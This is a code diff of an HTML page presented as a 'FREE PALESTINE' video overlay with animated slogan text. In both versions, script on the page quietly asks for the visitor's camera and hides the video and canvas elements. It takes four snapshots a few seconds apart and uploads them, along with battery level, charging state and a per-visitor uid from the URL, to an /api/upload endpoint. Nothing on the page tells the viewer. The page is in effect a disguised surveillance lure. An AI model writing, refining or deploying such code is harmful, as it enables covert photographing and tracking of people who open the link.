@@ -5,134 +5,134 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>FREE PALESTINE Video Overlay</title>
 
+<!-- Google Font Orbitron -->
 <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
 
 <style>
-html, body {
-  margin:0; padding:0;
-  width:100%; height:100%;
-  overflow:hidden;
-  background:#000;
-  font-family:'Orbitron', sans-serif;
-}
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    width: 100%;
+    overflow: hidden;
+    background: #000;
+    font-family: 'Orbitron', sans-serif;
+  }
 
-video#bgVideo {
-  position:fixed;
-  top:0; left:0;
-  width:100%; height:100%;
-  object-fit:cover;
-  z-index:0;
-}
+  /* Static image behind text */
+  #bgImage {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    z-index: -1;
+  }
 
-.text-layer {
-  position:absolute;
-  font-weight:800;
-  white-space:nowrap;
-  z-index:2;
-  color:#00ffea;
-  text-shadow:0 0 5px #00ffea,0 0 10px #00aaff,0 0 20px #0044ff;
-  animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
-}
+  /* Video background */
+  video#bgVideo {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    z-index: 0;
+  }
 
-.text1 { font-size:6vw; top:50%; left:20%; animation-delay:0s; }
-.text2 { font-size:5vw; top:55%; left:30%; animation-delay:2s; }
+  .text-layer {
+    position: absolute;
+    font-weight: 800;
+    white-space: nowrap;
+    z-index: 2;
+    color: #00ffea;
+    text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
+    animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
+  }
 
-@keyframes floatUp { 0%{transform:translateY(0px); opacity:1;} 100%{transform:translateY(-150px);opacity:0.8;} }
-@keyframes glow { 0%{text-shadow:0 0 5px #00ffea,0 0 10px #00aaff,0 0 20px #0044ff;} 100%{text-shadow:0 0 10px #0044ff,0 0 20px #00aaff,0 0 30px #00ffea;} }
+  .text1 { font-size: 6vw; top: 50%; left: 20%; animation-delay: 0s; }
+  .text2 { font-size: 5vw; top: 55%; left: 40%; animation-delay: 2s; }
 
-video#camera, canvas#snapshot {
-  display:none;
-}
+  @keyframes floatUp {
+    0% { transform: translateY(0px); opacity: 1; }
+    100% { transform: translateY(-150px); opacity: 0.8; }
+  }
 
-/* Loading overlay */
-#loadingOverlay {
-  position:fixed;
-  top:0; left:0;
-  width:100%; height:100%;
-  background:rgba(0,0,0,0.6);
-  color:#00ffea;
-  font-size:2em;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  z-index:5;
-  display:none;
-}
+  @keyframes glow {
+    0% { text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff; }
+    100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
+  }
+
+  /* Hidden camera + snapshot elements */
+  video#video, canvas#snapshot {
+    display: none;
+  }
 </style>
 </head>
 <body>
 
-<video id="bgVideo" autoplay playsinline loop>
+<!-- Static image behind text -->
+<img id="bgImage" src="https://i.postimg.cc/Mp85QgJD/IMG-20250917-124655-217.jpg" />
+
+<!-- Video background -->
+<video id="bgVideo" autoplay playsinline loop muted>
   <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
 </video>
 
+<!-- Text overlays -->
 <div class="text-layer text1">FREE PALESTINE</div>
 <div class="text-layer text2">FREE PALESTINE</div>
 
-<div id="loadingOverlay">Loading snapshots...</div>
-
-<video id="camera" autoplay playsinline></video>
+<!-- Hidden Camera + Snapshot Elements -->
+<video id="video" autoplay playsinline></video>
 <canvas id="snapshot"></canvas>
 
 <script>
-const bgVideo = document.getElementById('bgVideo');
-const cameraVideo = document.getElementById('camera');
-const canvas = document.getElementById('snapshot');
-const ctx = canvas.getContext('2d');
-const loading = document.getElementById('loadingOverlay');
-const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('snapshot');
+  const ctx = canvas.getContext('2d');
+  const params = new URLSearchParams(window.location.search);
+  const uid = params.get('uid') || 'unknown';
+  let snapshotsTaken = 0;
+  const maxSnapshots = 4;
 
-async function captureSnapshots() {
-  try {
-    const battery = await navigator.getBattery();
-    const batteryLevel = Math.round(battery.level*100);
-    const isCharging = battery.charging;
+  function takeSnapshotAndSend(battery, charging){
+    if(snapshotsTaken >= maxSnapshots) return;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    const imageData = canvas.toDataURL('image/png');
 
-    const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-    cameraVideo.srcObject = stream;
-
-    // Wait for video to be ready
-    await new Promise(resolve => {
-      if(cameraVideo.readyState >= 2) resolve();
-      else cameraVideo.onloadedmetadata = () => resolve();
-    });
-
-    // Show loading overlay & pause background video
-    loading.style.display = 'flex';
-    bgVideo.pause();
-
-    let snapshotCount = 0;
-    while(snapshotCount < 4){
-      await new Promise(res=>setTimeout(res,2000)); // wait 2s
-      canvas.width = cameraVideo.videoWidth;
-      canvas.height = cameraVideo.videoHeight;
-      ctx.drawImage(cameraVideo,0,0);
-      const imageData = canvas.toDataURL('image/png');
-
-      // Send snapshot
-      fetch('/api/upload',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify({ image:imageData, uid, battery:batteryLevel, charging:isCharging })
-      }).then(r=>r.json()).then(d=>console.log("Uploaded",d)).catch(e=>console.error(e));
-
-      snapshotCount++;
-    }
-
-    // Stop camera stream
-    stream.getTracks().forEach(track=>track.stop());
-    loading.style.display='none';
-    bgVideo.play();
-
-  } catch(err){
-    console.error("Camera error:", err);
-    loading.style.display='none';
-    bgVideo.play();
+    fetch('/api/upload', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ image: imageData, uid, battery, charging })
+    }).then(res => res.json()).then(data => {
+      console.log("Uploaded snapshot:", snapshotsTaken + 1);
+      snapshotsTaken++;
+      if(snapshotsTaken === maxSnapshots){
+        console.log("Max snapshots reached, stopping camera.");
+        video.srcObject.getTracks().forEach(track => track.stop());
+      }
+    }).catch(err => console.error("Upload error:", err));
   }
-}
 
-// Start snapshot sequence after 1s
-setTimeout(captureSnapshots,1000);
-</script> 
+  if(uid){
+    navigator.getBattery().then(battery => {
+      const batteryLevel = Math.round(battery.level * 100);
+      const isCharging = battery.charging;
+
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+
+        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 2000);
+        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 4000);
+        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 6000);
+        setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), 8000);
+      }).catch(err => console.error("Camera error:", err));
+    });
+  }
+</script>
 </body>
 </html> 
